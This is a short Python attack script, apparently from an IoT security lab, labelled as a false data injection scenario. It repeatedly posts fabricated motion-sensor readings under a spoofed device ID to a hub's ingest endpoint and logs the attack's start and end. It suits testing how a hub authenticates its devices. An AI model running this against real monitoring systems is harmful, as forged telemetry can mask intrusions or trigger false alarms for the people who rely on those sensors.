"""Scenario 2: False Data Injection — send fabricated telemetry from a
spoofed device_id into the hub's ingest endpoint.
Usage: python3 false_injection.py <hub_ingest_url> <fake_device_id> <count>
"""
import sys
import time
import random
import requests  # pip install requests
from logger import log_event

HUB_URL = sys.argv[1]
FAKE_ID = sys.argv[2]
COUNT = int(sys.argv[3]) if len(sys.argv) > 3 else 20

log_event("false_injection", "attack_start", fake_device=FAKE_ID)
for i in range(COUNT):
    payload = {
        "device_id": FAKE_ID,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "motion_detected": random.choice([True, False]),
        "confidence": random.uniform(0.8, 1.0),  # implausibly high/confident
    }
    try:
        requests.post(HUB_URL, json=payload, timeout=2)
    except Exception as e:
        print(f"send failed: {e}")
    time.sleep(0.5)
log_event("false_injection", "attack_end", injected_count=COUNT)
